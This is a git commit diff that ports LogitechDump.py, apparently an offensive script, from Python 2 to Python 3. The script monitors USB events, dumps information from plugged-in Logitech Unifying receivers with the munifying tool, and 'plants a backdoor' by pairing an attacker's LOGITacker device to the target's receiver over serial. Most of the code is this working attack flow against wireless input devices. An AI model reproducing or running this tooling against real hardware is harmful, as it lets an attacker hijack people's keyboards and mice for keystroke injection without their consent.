3588bd23de430b407a4ab51b9fdd772cec61ea6c
John <gloglas@volny.cz>
2020-09-08 18:41:35 +0200

    Python2/3 compatibility check

--- LogitechDump.py
+++ LogitechDump.py
@@ -2,7 +2,7 @@ import pyudev, os, serial
 from colorama import Fore, Back, Style
 
 if os.getuid() != 0:
-	print "You need a sudo to run this!"
+	print("You need a sudo to run this!")
 	exit()
 try:
 	mpath = '~/go/bin/' # Insert your munifying path here!
@@ -15,40 +15,40 @@ try:
 	for device in devices:
 		if device.get('ID_VENDOR_ID') in ['1915'] and not logitacker:
 			logitacker = True
-			print(Fore.GREEN + "Logitacker present!" + Style.RESET_ALL)
+			print((Fore.GREEN + "Logitacker present!" + Style.RESET_ALL))
 
 	for action, device in monitor:
 		vendor_id = device.get('ID_VENDOR_ID')
 		if vendor_id in ['1915']:
 			if action in ["bind","add"]:
 				logitacker = True
-				print(Fore.GREEN + "Logitacker present!" + Style.RESET_ALL)
+				print((Fore.GREEN + "Logitacker present!" + Style.RESET_ALL))
 			elif action == "remove":
 				logitacker = False
-				print(Fore.RED + "Logitacker disconnected! :(" + Style.RESET_ALL)
+				print((Fore.RED + "Logitacker disconnected! :(" + Style.RESET_ALL))
 	
 		if vendor_id in ['046d']:
-			print 'Detected {} for device with vendor ID {}'.format(action, vendor_id)
+			print('Detected {} for device with vendor ID {}'.format(action, vendor_id))
 			if action == "bind":
-				print(Fore.YELLOW + "(1/3) Dumping..." + Style.RESET_ALL)
+				print((Fore.YELLOW + "(1/3) Dumping..." + Style.RESET_ALL))
 				minfo = os.popen(mpath + 'munifying info').read()
-				print minfo
+				print(minfo)
 	
 				if logitacker and "LOGITacker" not in minfo:
 					minfo = None
-					print(Fore.YELLOW + "(2/3) Plantting backdoor!..." + Style.RESET_ALL)
+					print((Fore.YELLOW + "(2/3) Plantting backdoor!..." + Style.RESET_ALL))
 					ser = serial.Serial('/dev/ttyACM0')
 					ser.write(b'\npair device run\n')
-					print os.popen(mpath + 'munifying pair').read()
-					print(Fore.YELLOW + "(3/3) Attempt #2? just to be sure" + Style.RESET_ALL)
+					print(os.popen(mpath + 'munifying pair').read())
+					print((Fore.YELLOW + "(3/3) Attempt #2? just to be sure" + Style.RESET_ALL))
 					ser.write(b'\npair device run\n')
 					ser.close()
-					print(Fore.GREEN + "Done!" + Style.RESET_ALL)
+					print((Fore.GREEN + "Done!" + Style.RESET_ALL))
 				else:
-					print(Fore.YELLOW + "(2/3) Skipping backdoor" + Style.RESET_ALL)
-					print(Fore.YELLOW + "(3/3) Done!" + Style.RESET_ALL)
+					print((Fore.YELLOW + "(2/3) Skipping backdoor" + Style.RESET_ALL))
+					print((Fore.YELLOW + "(3/3) Done!" + Style.RESET_ALL))
 			elif action == "remove":
-				print(Fore.RED + "Target disconnected!" + Style.RESET_ALL)
+				print((Fore.RED + "Target disconnected!" + Style.RESET_ALL))
 except KeyboardInterrupt:
-	print " Bye!"
+	print(" Bye!")
 	exit()
